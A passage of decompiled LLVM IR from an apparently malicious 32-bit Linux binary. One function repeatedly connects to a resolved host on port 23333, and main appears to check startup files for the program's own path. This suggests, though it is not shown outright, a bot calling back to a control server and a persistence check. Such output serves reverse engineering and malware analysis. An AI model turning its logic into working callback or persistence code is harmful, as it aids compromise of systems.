  %v0_804939e = load i32, i32* @global_var_8056a1c.289, align 4
  store i32 %v0_804939e, i32* %eax.global-to-local, align 4
  %v3_80493a6 = inttoptr i32 %v0_8049397 to i32*
  store i32 %v0_804939e, i32* %v3_80493a6, align 4
  %v0_80493a7 = load i32, i32* %stack_var_-36, align 4
  %v1_80493a7 = call i32 @inet_addr(i32 %v0_80493a7)
  store i32 %v1_80493a7, i32* %eax.global-to-local, align 4
  %v0_80493ac = load i32, i32* @esp, align 4
  %v10_80493af = icmp eq i32 %v1_80493a7, -1
  %v1_80493b2 = icmp eq i1 %v10_80493af, false
  br i1 %v1_80493b2, label %dec_label_pc_8049414, label %dec_label_pc_80493b4

dec_label_pc_80493b4:                             ; preds = %dec_label_pc_804939e, %dec_label_pc_8049389
  %v0_80493b9.in = phi i32 [ %v0_80493ac, %dec_label_pc_804939e ], [ %v0_8049397, %dec_label_pc_8049389 ]
  %v0_80493b4 = load i32, i32* @global_var_8056a1c.289, align 4
  store i32 %v0_80493b4, i32* %eax.global-to-local, align 4
  %v3_80493bc = inttoptr i32 %v0_80493b9.in to i32*
  store i32 %v0_80493b4, i32* %v3_80493bc, align 4
  %v0_80493bd = load i32, i32* %stack_var_-36, align 4
  %v1_80493bd = call i32 @__GI_gethostbyname(i32 %v0_80493bd)
  store i32 %v1_80493bd, i32* %eax.global-to-local, align 4
  %v0_80493c2 = load i32, i32* @esp, align 4
  %v4_80493c8 = icmp eq i32 %v1_80493bd, 0
  %v1_80493cc = icmp eq i1 %v4_80493c8, false
  br i1 %v1_80493cc, label %dec_label_pc_80493ee, label %dec_label_pc_80493ce

dec_label_pc_80493ce:                             ; preds = %dec_label_pc_80493b4
  store i32 0, i32* @global_var_8056a1c.289, align 4
  %v0_80493d8 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80493d8, i32* %eax.global-to-local, align 4
  %v3_80493e0 = inttoptr i32 %v0_80493c2 to i32*
  store i32 %v0_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = call i32 @__libc_close(i32 %v1_80493bd)
  br label %dec_label_pc_8049323.backedge

dec_label_pc_8049323.backedge:                    ; preds = %dec_label_pc_80493ce, %dec_label_pc_8049530
  %storemerge = phi i32 [ %v1_80493e1, %dec_label_pc_80493ce ], [ %v1_8049543, %dec_label_pc_8049530 ]
  %stack_var_-8.0.be = phi i32 [ %v1_80493bd, %dec_label_pc_80493ce ], [ %stack_var_-8.1, %dec_label_pc_8049530 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge18.in = load i32, i32* @esp, align 4
  %storemerge16.in = add i32 %storemerge18.in, 16
  br label %dec_label_pc_8049323

dec_label_pc_80493ee:                             ; preds = %dec_label_pc_80493b4
  store i32 %v1_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493f1 = add i32 %v1_80493bd, 12
  %v2_80493f1 = inttoptr i32 %v1_80493f1 to i32*
  %v3_80493f1 = load i32, i32* %v2_80493f1, align 4
  store i32 %v3_80493f1, i32* %edx.global-to-local, align 4
  store i32 %v1_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493ff = add i32 %v1_80493bd, 16
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  %v3_80493ff = load i32, i32* %v2_80493ff, align 4
  store i32 %v3_80493ff, i32* %eax.global-to-local, align 4
  %v1_8049402 = inttoptr i32 %v3_80493ff to i32*
  %v2_8049402 = load i32, i32* %v1_8049402, align 4
  store i32 %v2_8049402, i32* %eax.global-to-local, align 4
  %v2_8049407 = add i32 %v0_80493c2, 8
  %v3_8049407 = inttoptr i32 %v2_8049407 to i32*
  store i32 %v3_80493f1, i32* %v3_8049407, align 4
  %v2_8049408 = add i32 %v0_80493c2, 4
  %v3_8049408 = inttoptr i32 %v2_8049408 to i32*
  store i32 %v2_80493f9, i32* %v3_8049408, align 4
  %v0_8049409 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049409 = inttoptr i32 %v0_80493c2 to i32*
  store i32 %v0_8049409, i32* %v3_8049409, align 4
  %v1_804940a = load i32, i32* %stack_var_-4, align 4
  %v2_804940a = load i32, i32* %stack_var_0, align 4
  %v3_804940a = call i32 @bcopy(i32 %v1_80493bd, i32 %v1_804940a, i32 %v2_804940a)
  store i32 %v3_804940a, i32* %eax.global-to-local, align 4
  %v0_804940f = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049428

dec_label_pc_8049414:                             ; preds = %dec_label_pc_804939e
  %v0_8049414 = load i32, i32* @global_var_8056a1c.289, align 4
  store i32 %v0_8049414, i32* %eax.global-to-local, align 4
  %v3_804941c = inttoptr i32 %v0_80493ac to i32*
  store i32 %v0_8049414, i32* %v3_804941c, align 4
  %v1_804941d = call i32 @inet_addr(i32 %stack_var_-8.0)
  store i32 %v1_804941d, i32* %eax.global-to-local, align 4
  %v0_8049422 = load i32, i32* @esp, align 4
  store i32 %v1_804941d, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8049428

dec_label_pc_8049428:                             ; preds = %dec_label_pc_80493ee, %dec_label_pc_8049414
  %v0_804942e.in = phi i32 [ %v0_804940f, %dec_label_pc_80493ee ], [ %v0_8049422, %dec_label_pc_8049414 ]
  %stack_var_-8.1 = phi i32 [ %v1_80493bd, %dec_label_pc_80493ee ], [ %stack_var_-8.0, %dec_label_pc_8049414 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_8049431 = inttoptr i32 %v0_804942e.in to i32*
  store i32 23333, i32* %v2_8049431, align 4
  %v0_8049436 = load i32, i32* %stack_var_-32, align 4
  %v1_8049436 = call i32 @htons(i32 %v0_8049436)
  %v0_804943b = load i32, i32* @esp, align 4
  %v0_8049442 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_8049442, i32* %edx.global-to-local, align 4
  store i32 %v2_804944b, i32* %eax.global-to-local, align 4
  %v2_804944e = add i32 %v0_804943b, 8
  %v3_804944e = inttoptr i32 %v2_804944e to i32*
  store i32 %v2_804944b, i32* %v3_804944e, align 4
  %v1_804944f = add i32 %v0_804943b, 4
  %v2_804944f = inttoptr i32 %v1_804944f to i32*
  store i32 21537, i32* %v2_804944f, align 4
  %v0_8049454 = load i32, i32* %edx.global-to-local, align 4
  %v3_8049454 = inttoptr i32 %v0_804943b to i32*
  store i32 %v0_8049454, i32* %v3_8049454, align 4
  %sext = mul i32 %v1_8049436, 65536
  %v1_8049455 = sdiv i32 %sext, 65536
  %v4_8049455 = call i32 @ioctl(i32 %v1_8049455, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049455, i32* %eax.global-to-local, align 4
  %v0_804945a = load i32, i32* @esp, align 4
  %v2_8049460 = inttoptr i32 %v0_804945a to i32*
  store i32 0, i32* %v2_8049460, align 4
  %v2_8049462 = inttoptr i32 %v1_8049455 to i32*
  %v3_8049462 = call i32 @__GI_time(i32* %v2_8049462)
  store i32 %v3_8049462, i32* %eax.global-to-local, align 4
  %v1_804951c = inttoptr i32 %v3_8049462 to i32*
  br label %dec_label_pc_8049517

dec_label_pc_8049472:                             ; preds = %dec_label_pc_8049517
  %v1_8049472 = call i32 @__errno_location(i32 %v3_8049462)
  %v1_8049477 = inttoptr i32 %v1_8049472 to i32*
  store i32 0, i32* %v1_8049477, align 4
  store i32 %v2_80493f6, i32* %eax.global-to-local, align 4
  %v0_8049480 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_8049480, i32* %edx.global-to-local, align 4
  %v0_8049486 = load i32, i32* @esp, align 4
  %v1_8049489 = add i32 %v0_8049486, -8
  %v2_8049489 = inttoptr i32 %v1_8049489 to i32*
  store i32 16, i32* %v2_8049489, align 4
  %v2_804948b = add i32 %v0_8049486, -12
  %v3_804948b = inttoptr i32 %v2_804948b to i32*
  store i32 %v2_80493f6, i32* %v3_804948b, align 4
  %v0_804948c = load i32, i32* %edx.global-to-local, align 4
  %v2_804948c = add i32 %v0_8049486, -16
  %v3_804948c = inttoptr i32 %v2_804948c to i32*
  store i32 %v0_804948c, i32* %v3_804948c, align 4
  %v2_804948d = load i32, i32* %stack_var_-4, align 4
  %v3_804948d = call i32 @__libc_connect(i32 %v3_8049462, i32 %stack_var_-8.1, i32 %v2_804948d)
  store i32 %v3_804948d, i32* %eax.global-to-local, align 4
  %v0_8049492 = load i32, i32* @esp, align 4
  %v1_8049492 = add i32 %v0_8049492, 16
  %v1_8049495 = icmp eq i32 %v3_804948d, 0
  br i1 %v1_8049495, label %dec_label_pc_80494a5, label %dec_label_pc_8049499

dec_label_pc_8049499:                             ; preds = %dec_label_pc_8049472
  %v1_8049499 = call i32 @__errno_location(i32 %v3_8049462)
  store i32 %v1_8049499, i32* %eax.global-to-local, align 4
  %v1_804949e = inttoptr i32 %v1_8049499 to i32*
  %v2_804949e = load i32, i32* %v1_804949e, align 4
  store i32 %v2_804949e, i32* %eax.global-to-local, align 4
  %v9_80494a0 = icmp eq i32 %v2_804949e, 106
  %v1_80494a3 = icmp eq i1 %v9_80494a0, false
  br i1 %v1_80494a3, label %dec_label_pc_80494f2, label %dec_label_pc_8049499.dec_label_pc_80494a5_crit_edge

dec_label_pc_8049499.dec_label_pc_80494a5_crit_edge: ; preds = %dec_label_pc_8049499
  %v0_80494aa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494a5

dec_label_pc_80494a5:                             ; preds = %dec_label_pc_8049472, %dec_label_pc_8049499.dec_label_pc_80494a5_crit_edge
  %v0_80494aa = phi i32 [ %v0_80494aa.pre, %dec_label_pc_8049499.dec_label_pc_80494a5_crit_edge ], [ %v1_8049492, %dec_label_pc_8049472 ]
  %v0_80494a5 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80494a5, i32* %eax.global-to-local, align 4
  %v1_80494ad = add i32 %v0_80494aa, -16
  %v2_80494ad = inttoptr i32 %v1_80494ad to i32*
  store i32 0, i32* %v2_80494ad, align 4
  %v1_80494af = add i32 %v0_80494aa, -20
  %v2_80494af = inttoptr i32 %v1_80494af to i32*
  store i32 0, i32* %v2_80494af, align 4
  %v1_80494b1 = add i32 %v0_80494aa, -24
  %v2_80494b1 = inttoptr i32 %v1_80494b1 to i32*
  store i32 13, i32* %v2_80494b1, align 4
  %v1_80494b3 = add i32 %v0_80494aa, -28
  %v2_80494b3 = inttoptr i32 %v1_80494b3 to i32*
  store i32 1, i32* %v2_80494b3, align 4
  %v0_80494b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80494b5 = add i32 %v0_80494aa, -32
  %v3_80494b5 = inttoptr i32 %v2_80494b5 to i32*
  store i32 %v0_80494b5, i32* %v3_80494b5, align 4
  %v0_80494b6 = call i32 @__GI_setsockopt()
  %v0_80494bb = load i32, i32* @esp, align 4
  %v0_80494be = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80494be, i32* %eax.global-to-local, align 4
  %v1_80494c6 = add i32 %v0_80494bb, 16
  %v2_80494c6 = inttoptr i32 %v1_80494c6 to i32*
  store i32 0, i32* %v2_80494c6, align 4
  %v1_80494c8 = add i32 %v0_80494bb, 12
  %v2_80494c8 = inttoptr i32 %v1_80494c8 to i32*
  store i32 0, i32* %v2_80494c8, align 4
  %v1_80494ca = add i32 %v0_80494bb, 8
  %v2_80494ca = inttoptr i32 %v1_80494ca to i32*
  store i32 2, i32* %v2_80494ca, align 4
  %v1_80494cc = add i32 %v0_80494bb, 4
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  store i32 1, i32* %v2_80494cc, align 4
  %v0_80494ce = load i32, i32* %eax.global-to-local, align 4
  %v3_80494ce = inttoptr i32 %v0_80494bb to i32*
  store i32 %v0_80494ce, i32* %v3_80494ce, align 4
  %v0_80494cf = call i32 @__GI_setsockopt()
  %v0_80494d4 = load i32, i32* @esp, align 4
  %v0_80494d7 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80494d7, i32* %eax.global-to-local, align 4
  %v1_80494df = add i32 %v0_80494d4, 16
  %v2_80494df = inttoptr i32 %v1_80494df to i32*
  store i32 0, i32* %v2_80494df, align 4
  %v1_80494e1 = add i32 %v0_80494d4, 12
  %v2_80494e1 = inttoptr i32 %v1_80494e1 to i32*
  store i32 0, i32* %v2_80494e1, align 4
  %v1_80494e3 = add i32 %v0_80494d4, 8
  %v2_80494e3 = inttoptr i32 %v1_80494e3 to i32*
  store i32 9, i32* %v2_80494e3, align 4
  %v1_80494e5 = add i32 %v0_80494d4, 4
  %v2_80494e5 = inttoptr i32 %v1_80494e5 to i32*
  store i32 1, i32* %v2_80494e5, align 4
  %v0_80494e7 = load i32, i32* %eax.global-to-local, align 4
  %v3_80494e7 = inttoptr i32 %v0_80494d4 to i32*
  store i32 %v0_80494e7, i32* %v3_80494e7, align 4
  %v0_80494e8 = call i32 @__GI_setsockopt()
  store i32 %v0_80494e8, i32* %eax.global-to-local, align 4
  %v2_8049550 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049550, i32* @ebp, align 4
  ret i32 %v0_80494e8

dec_label_pc_80494f2:                             ; preds = %dec_label_pc_8049499
  %v1_80494f2 = call i32 @__errno_location(i32 %v3_8049462)
  store i32 %v1_80494f2, i32* %eax.global-to-local, align 4
  %v1_80494f7 = inttoptr i32 %v1_80494f2 to i32*
  %v2_80494f7 = load i32, i32* %v1_80494f7, align 4
  store i32 %v2_80494f7, i32* %eax.global-to-local, align 4
  %v9_80494f9 = icmp eq i32 %v2_80494f7, 115
  br i1 %v9_80494f9, label %dec_label_pc_804950a, label %dec_label_pc_80494fe

dec_label_pc_80494fe:                             ; preds = %dec_label_pc_80494f2
  %v1_80494fe = call i32 @__errno_location(i32 %v3_8049462)
  store i32 %v1_80494fe, i32* %eax.global-to-local, align 4
  %v1_8049503 = inttoptr i32 %v1_80494fe to i32*
  %v2_8049503 = load i32, i32* %v1_8049503, align 4
  store i32 %v2_8049503, i32* %eax.global-to-local, align 4
  %v9_8049505 = icmp eq i32 %v2_8049503, 114
  %v1_8049508 = icmp eq i1 %v9_8049505, false
  br i1 %v1_8049508, label %dec_label_pc_80494fe.dec_label_pc_8049530_crit_edge, label %dec_label_pc_804950a

dec_label_pc_80494fe.dec_label_pc_8049530_crit_edge: ; preds = %dec_label_pc_80494fe
  %v0_804953f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049530

dec_label_pc_804950a:                             ; preds = %dec_label_pc_80494fe, %dec_label_pc_80494f2
  %v0_804950a = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950a, -16
  %v2_804950d = inttoptr i32 %v1_804950d to i32*
  store i32 1, i32* %v2_804950d, align 4
  %v1_804950f = call i32 @sleep(i32 %v3_8049462)
  store i32 %v1_804950f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049517

dec_label_pc_8049517:                             ; preds = %dec_label_pc_8049428, %dec_label_pc_804950a
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_804951a = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_804951a, align 4
  %v2_804951c = call i32 @__GI_time(i32* %v1_804951c)
  %v0_8049521 = load i32, i32* @esp, align 4
  %v1_8049521 = add i32 %v0_8049521, 16
  %v5_8049524 = sub i32 %v2_804951c, %v3_8049462
  store i32 %v5_8049524, i32* %eax.global-to-local, align 4
  %tmp38 = icmp ult i32 %v5_8049524, 10
  br i1 %tmp38, label %dec_label_pc_8049472, label %dec_label_pc_8049530

dec_label_pc_8049530:                             ; preds = %dec_label_pc_8049517, %dec_label_pc_80494fe.dec_label_pc_8049530_crit_edge
  %v0_804953f = phi i32 [ %v0_804953f.pre, %dec_label_pc_80494fe.dec_label_pc_8049530_crit_edge ], [ %v1_8049521, %dec_label_pc_8049517 ]
  store i32 0, i32* @global_var_8056a1c.289, align 4
  %v0_804953a = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_804953a, i32* %eax.global-to-local, align 4
  %v2_8049542 = add i32 %v0_804953f, -16
  %v3_8049542 = inttoptr i32 %v2_8049542 to i32*
  store i32 %v0_804953a, i32* %v3_8049542, align 4
  %v1_8049543 = call i32 @__libc_close(i32 %v3_8049462)
  br label %dec_label_pc_8049323.backedge

; uselistorder directives
  uselistorder i32 %v0_80494aa, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_8049462, { 0, 7, 2, 1, 3, 4, 5, 6, 8, 9 }
  uselistorder i32 %v1_8049455, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 0 }
  uselistorder i32 %v0_80493c2, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80493bd, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_80493ac, { 1, 0 }
  uselistorder i32 %v3_8049373, { 2, 1, 0 }
  uselistorder i32 %v0_804936a, { 2, 1, 0 }
  uselistorder i32 %v2_80493f6, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-32, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 17, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 21537, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049517, { 1, 0 }
  uselistorder label %dec_label_pc_80494a5, { 1, 0 }
  uselistorder label %dec_label_pc_8049428, { 1, 0 }
  uselistorder label %dec_label_pc_8049323.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8049360, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp82 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-32 = alloca i8*, align 4
  %tmp85 = call i32 @__decompiler_undefined_function_0()
  %tmp93 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2712 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-398 = alloca i32, align 4
  %stack_var_-1688 = alloca i32, align 4
  %stack_var_-664 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-6864 = alloca i8*, align 4
  %stack_var_-6848 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8049552 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8049552, i32* %ecx.global-to-local, align 4
  %v15_8049563 = ptrtoint i32* %stack_var_-6848 to i32
  store i32 %v2_8049552, i32* %edx.global-to-local, align 4
  %v1_8049575 = add i32 %v2_8049552, 4
  %v2_8049575 = inttoptr i32 %v1_8049575 to i32*
  %v3_8049575 = load i32, i32* %v2_8049575, align 4
  store i32 %v3_8049575, i32* %eax.global-to-local, align 4
  %v1_8049578 = inttoptr i32 %v3_8049575 to i32*
  %v2_8049578 = load i32, i32* %v1_8049578, align 4
  store i32 %v2_8049578, i32* @eax, align 4
  %v5_8049584 = icmp ult i32* %stack_var_-6848, inttoptr (i32 8 to i32*)
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  %tmp129 = bitcast i8** %stack_var_-6864 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8051218.290 to i32), i32* %tmp129, align 4
  %v3_804958f = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8051218.290 to i32), i32 ptrtoint (i32* @global_var_8051110.258 to i32))
  store i32 %v3_804958f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804959a = icmp eq i32 %v3_804958f, 0
  %v1_804959e = icmp eq i1 %v4_804959a, false
  br i1 %v1_804959e, label %dec_label_pc_80495bd, label %dec_label_pc_80495a0

dec_label_pc_80495a0:                             ; preds = %entry
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_805122b.291 to i32), i32* %tmp129, align 4
  %v3_80495b2 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_805122b.291 to i32), i32 ptrtoint (i32* @global_var_8051110.258 to i32))
  store i32 %v3_80495b2, i32* %eax.global-to-local, align 4
  %v0_80495b7 = load i32, i32* @esp, align 4
  %v2_80495b7 = icmp ugt i32 %v0_80495b7, -17
  store i1 %v2_80495b7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80495bd

dec_label_pc_80495bd:                             ; preds = %entry, %dec_label_pc_80495a0
  %stack_var_-80.0 = phi i32 [ %v3_804958f, %entry ], [ %v3_80495b2, %dec_label_pc_80495a0 ]
  %v3_804970d10 = phi i32 [ ptrtoint ([19 x i8]* @global_var_8051218.290 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_805122b.291 to i32), %dec_label_pc_80495a0 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80495bd = icmp eq i32 %stack_var_-80.0, 0
  br i1 %v4_80495bd, label %dec_label_pc_8049764, label %dec_label_pc_80495c7

dec_label_pc_80495c7:                             ; preds = %dec_label_pc_80495bd
  store i32 %v2_8049552, i32* %ecx.global-to-local, align 4
  %v3_80495cd = load i32, i32* %v2_8049575, align 4
  store i32 %v3_80495cd, i32* %eax.global-to-local, align 4
  %v1_80495d0 = inttoptr i32 %v3_80495cd to i32*
  %v2_80495d0 = load i32, i32* %v1_80495d0, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80495dd = and i32 %v2_80495d0, -256
  store i32 %v1_80495dd, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80495e0 = inttoptr i32 %v2_80495d0 to i8*
  store i32 %v2_80495d0, i32* @edi, align 4
  %v3_80495e6 = call i32 @_strlen(i8* %v4_80495e0)
  %v4_80495e6 = mul i32 %v3_80495e6, -1
  %v5_80495e6 = add i32 %v4_80495e6, -2
  store i32 %v5_80495e6, i32* %ecx.global-to-local, align 4
  %v0_80495f7 = load i32, i32* @esp, align 4
  %v5_80495f7 = icmp ult i32 %v0_80495f7, 8
  store i1 %v5_80495f7, i1* %cf.global-to-local, align 1
  %v2_80495ff = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_80495ff, i32* %eax.global-to-local, align 4
  %tmp130 = bitcast i32* %stack_var_-348 to i8*
  store i8* %tmp130, i8** %stack_var_-6864, align 4
  %v3_8049606 = call i32 @getcwd(i32 %v2_80495ff, i32 256)
  %v0_804960b = load i32, i32* @esp, align 4
  %v2_804960b = icmp ugt i32 %v0_804960b, -17
  store i1 %v2_804960b, i1* %cf.global-to-local, align 1
  store i32 %v2_80495ff, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_80495ff, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8051238.292 to i32), i32* @edi, align 4
  store i32 2, i32* %ecx.global-to-local, align 4
  %v7_8049641 = call i32 @_strncmp(i8* %tmp130, i8* bitcast (i8** @global_var_8051238.292 to i8*), i32 2)
  %v8_8049641 = urem i32 %v7_8049641, 2
  %v9_8049641 = icmp eq i32 %v8_8049641, 0
  %v0_8049643 = load i1, i1* %cf.global-to-local, align 1
  %v2_8049643 = or i1 %v0_8049643, %v9_8049641
  %v3_8049643 = zext i1 %v2_8049643 to i32
  %v4_8049643 = load i32, i32* @edx, align 4
  %v5_8049643 = and i32 %v4_8049643, -256
  %v6_8049643 = or i32 %v3_8049643, %v5_8049643
  %v7_8049643 = xor i32 %v6_8049643, 1
  store i32 %v7_8049643, i32* %edx.global-to-local, align 4
  %v5_8049646 = ptrtoint i32* %stack_var_-512 to i32
  %v3_8049649 = and i32 %v7_8049641, -256
  %v1_804964b = trunc i32 %v7_8049643 to i8
  %v3_804964b = trunc i32 %v5_8049646 to i8
  %v4_804964b = sub i8 %v1_804964b, %v3_804964b
  %v15_804964b = icmp eq i8 %v4_804964b, 0
  %v20_804964b = zext i8 %v4_804964b to i32
  %v23_804964b = or i32 %v20_804964b, %v3_8049649
  store i32 %v23_804964b, i32* @ecx, align 4
  %v2_804964f = sext i8 %v4_804964b to i32
  store i32 %v2_804964f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804964b, label %dec_label_pc_8049756, label %dec_label_pc_804965f.preheader

dec_label_pc_804965f.preheader:                   ; preds = %dec_label_pc_80495c7
  %v1_80495ec = sub i32 0, %v4_80495e6
  br label %dec_label_pc_804965f

dec_label_pc_804965c:                             ; preds = %dec_label_pc_804965f
  %v4_804965c = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_804965f.preheader, %dec_label_pc_804965c
  %stack_var_-64.0 = phi i32 [ %v4_804965c, %dec_label_pc_804965c ], [ %v1_80495ec, %dec_label_pc_804965f.preheader ]
  store i32 %v2_8049552, i32* @esi, align 4
  %v3_8049665 = load i32, i32* %v2_8049575, align 4
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v1_8049668 = inttoptr i32 %v3_8049665 to i32*
  %v2_8049668 = load i32, i32* %v1_8049668, align 4
  store i32 %v2_8049668, i32* %edx.global-to-local, align 4
  %v2_804966d = add i32 %v2_8049668, %stack_var_-64.0
  store i32 %v2_804966d, i32* %eax.global-to-local, align 4
  %v1_8049670 = inttoptr i32 %v2_804966d to i8*
  %v2_8049670 = load i8, i8* %v1_8049670, align 1
  %v3_8049670 = zext i8 %v2_8049670 to i32
  %v5_8049670 = and i32 %v2_804966d, -256
  %v6_8049670 = or i32 %v3_8049670, %v5_8049670
  store i32 %v6_8049670, i32* %eax.global-to-local, align 4
  %v6_8049672 = icmp ult i8 %v2_8049670, 47
  store i1 %v6_8049672, i1* %cf.global-to-local, align 1
  %v10_8049672 = icmp eq i8 %v2_8049670, 47
  %v1_8049674 = icmp eq i1 %v10_8049672, false
  br i1 %v1_8049674, label %dec_label_pc_804965c, label %dec_label_pc_8049676

dec_label_pc_8049676:                             ; preds = %dec_label_pc_804965f
  store i32 %v2_8049552, i32* @edi, align 4
  %v3_804967c = load i32, i32* %v2_8049575, align 4
  store i32 %v3_804967c, i32* %eax.global-to-local, align 4
  %v1_804967f = inttoptr i32 %v3_804967c to i32*
  %v2_804967f = load i32, i32* %v1_804967f, align 4
  store i32 %v2_804967f, i32* %edx.global-to-local, align 4
  %v2_8049684 = add i32 %v2_804967f, %stack_var_-64.0
  %v2_8049694 = ptrtoint i32* %stack_var_-664 to i32
  store i32 %v2_8049694, i32* %eax.global-to-local, align 4
  %tmp131 = bitcast i32* %stack_var_-664 to i8*
  store i8* %tmp131, i8** %stack_var_-6864, align 4
  %v5_804969b = call i32 @sprintf(i32 %v2_8049694, i32 ptrtoint ([8 x i8]* @global_var_805123a.293 to i32), i32 %v2_80495ff, i32 %v2_8049684)
  store i32 %v5_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v2_80496a0 = icmp ugt i32 %v0_80496a0, -17
  store i1 %v2_80496a0, i1* %cf.global-to-local, align 1
  %v8_80496e2 = inttoptr i32 %stack_var_-80.0 to i8*
  %tmp132 = inttoptr i32 %stack_var_-80.0 to i32*
  %v2_80496b0 = ptrtoint i32* %stack_var_-1688 to i32
  %tmp133 = bitcast i32* %stack_var_-1688 to i8*
  %v5_80496df = icmp ult i32* %stack_var_-6848, inttoptr (i32 12 to i32*)
  %v5_80496a5 = icmp ult i32* %stack_var_-6848, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_80496df.outer

dec_label_pc_80496a5:                             ; preds = %dec_label_pc_80496df
  store i1 %v5_80496a5, i1* %cf.global-to-local, align 1
  store i32 %v2_80496b0, i32* %eax.global-to-local, align 4
  store i8* %tmp133, i8** %stack_var_-6864, align 4
  %v4_80496b7 = call i32 @fgets(i32 %v2_80496b0, i32 1024, i32 %stack_var_-80.0)
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  store i32 %v2_80496b0, i32* %eax.global-to-local, align 4
  store i8* %tmp133, i8** %stack_var_-6864, align 4
  %v4_80496d0 = call i32 @__GI_strcasecmp(i8* %tmp133, i32 %v2_8049694)
  store i32 %v4_80496d0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80496d8 = icmp eq i32 %v4_80496d0, 0
  %v1_80496da = icmp eq i1 %v1_80496d8, false
  br i1 %v1_80496da, label %dec_label_pc_80496df, label %dec_label_pc_80496dc

dec_label_pc_80496dc:                             ; preds = %dec_label_pc_80496a5
  %v4_80496dc = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_80496df.outer

dec_label_pc_80496df.outer:                       ; preds = %dec_label_pc_80496dc, %dec_label_pc_8049676
  %stack_var_-60.0.ph = phi i32 [ %v4_80496dc, %dec_label_pc_80496dc ], [ 0, %dec_label_pc_8049676 ]
  br label %dec_label_pc_80496df

dec_label_pc_80496df:                             ; preds = %dec_label_pc_80496df.outer, %dec_label_pc_80496a5
  store i1 %v5_80496df, i1* %cf.global-to-local, align 1
  store i8* %v8_80496e2, i8** %stack_var_-6864, align 4
